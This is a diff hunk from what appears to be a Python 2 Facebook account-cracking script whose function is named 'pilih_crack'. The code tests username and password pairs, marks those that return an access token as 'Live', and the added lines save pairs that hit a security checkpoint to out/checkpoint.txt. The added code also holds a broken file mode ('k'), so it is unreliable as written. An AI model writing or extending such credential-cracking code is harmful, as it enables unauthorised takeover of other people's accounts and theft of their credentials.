@@ -842,6 +842,13 @@ def pilih_crack():
 																									if 'access_token' in s:
 																										print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass12
 																										oks.append(user+pass12)
+																									else:
+																										if 'www.facebook.com' in s["error_msg"]:
+																											print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass12
+																											cek = open("out/checkpoint.txt", "k")
+																											cek.write(user+"|"+pass12+"\n")
+																											cek.close()
+																											cekpoint.append(user+pass12)
 																									
 																																																								
 																	
